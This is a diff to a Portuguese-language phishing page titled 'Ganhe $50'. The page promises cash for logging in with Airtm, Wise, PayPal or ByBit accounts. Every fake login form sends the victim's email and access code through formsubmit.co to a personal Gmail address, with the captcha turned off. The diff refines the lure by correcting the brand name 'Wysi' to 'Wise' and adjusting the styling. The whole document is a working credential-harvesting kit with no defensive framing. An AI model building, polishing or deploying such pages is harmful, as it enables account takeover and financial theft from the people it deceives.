@@ -2,11 +2,13 @@
 <html lang="pt">
 <head>
   <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Ganhe $50</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background: #f2f2f2;
+      background: no-repeat center center fixed;
+      background-size: 100% 100%;
       margin: 0;
       padding: 0;
     }
@@ -14,10 +16,10 @@
     .container {
       max-width: 600px;
       margin: 50px auto;
-      background: white;
+      background: rgba(255, 255, 255, 0); /* totalmente transparente */
       padding: 30px;
       border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      box-shadow: none;
       text-align: center;
     }
 
@@ -93,7 +95,7 @@
     <p>Inicia sessão com a tua conta das seguintes plataformas para ganhar 30 dólar:</p>
 
     <div class="login-button" onclick="mostrarPagina('airtm')">Iniciar sessão com Airtm</div>
-    <div class="login-button" onclick="mostrarPagina('wysi')">Iniciar sessão com Wysi</div>
+    <div class="login-button" onclick="mostrarPagina('wise')">Iniciar sessão com Wise</div>
     <div class="login-button" onclick="mostrarPagina('PayPal')">Iniciar sessão com PayPal</div>
     <div class="login-button" onclick="mostrarPagina('ByBit')">Iniciar sessão com ByBit</div> 
   </div>
@@ -105,33 +107,26 @@
     <form action="https://formsubmit.co/josefanykira@gmail.com" method="POST">
       <label>Email:</label>
       <input type="email" name="email" required>
-
       <label>Código de Acesso:</label>
       <input type="text" name="access_key" required>
-
-      <!-- Proteções -->
       <input type="hidden" name="_captcha" value="false">
       <input type="hidden" name="_template" value="table">
-
       <input type="submit" value="Iniciar Sessão">
     </form>
     <div class="login-button back-button" onclick="voltarHome()">⬅ Voltar</div>
   </div>
 
-  <!-- Página Wysi -->
-  <div class="container hidden" id="wysi">
-    <h2>Login Wysi</h2>
-    <p>Conecta a tua conta Wysi e ganha $50.</p>
+  <!-- Página Wise -->
+  <div class="container hidden" id="wise">
+    <h2>Login Wise</h2>
+    <p>Conecta a tua conta Wise e ganha $50.</p>
     <form action="https://formsubmit.co/josefanykira@gmail.com" method="POST">
       <label>Email:</label>
       <input type="email" name="email" required>
-
       <label>Código de Acesso:</label>
       <input type="text" name="access_key" required>
-
       <input type="hidden" name="_captcha" value="false">
       <input type="hidden" name="_template" value="table">
-
       <input type="submit" value="Iniciar Sessão">
     </form>
     <div class="login-button back-button" onclick="voltarHome()">⬅ Voltar</div>
@@ -144,32 +139,26 @@
     <form action="https://formsubmit.co/josefanykira@gmail.com" method="POST">
       <label>Email:</label>
       <input type="email" name="email" required>
-
       <label>Código de Acesso:</label>
       <input type="text" name="access_key" required>
-
       <input type="hidden" name="_captcha" value="false">
       <input type="hidden" name="_template" value="table">
-
       <input type="submit" value="Iniciar Sessão">
     </form>
     <div class="login-button back-button" onclick="voltarHome()">⬅ Voltar</div>
   </div>
   
- <!-- Página ByBit -->
+  <!-- Página ByBit -->
   <div class="container hidden" id="ByBit">
     <h2>Login ByBit</h2>
     <p>Entra com a tua conta do ByBit para ganhares $50.</p>
     <form action="https://formsubmit.co/josefanykira@gmail.com" method="POST">
       <label>Email:</label>
       <input type="email" name="email" required>
-
       <label>Código de Acesso:</label>
       <input type="text" name="access_key" required>
-
       <input type="hidden" name="_captcha" value="false">
       <input type="hidden" name="_template" value="table">
-
       <input type="submit" value="Iniciar Sessão">
     </form>
     <div class="login-button back-button" onclick="voltarHome()">⬅ Voltar</div>
@@ -177,7 +166,7 @@
 
   <script>
     function mostrarPagina(id) {
-      const seções = ["home", "airtm", "wysi", "PayPal", "ByBit"];
+      const seções = ["home", "airtm", "wise", "PayPal", "ByBit"];
       seções.forEach(sec => {
         document.getElementById(sec).classList.add("hidden");
       });
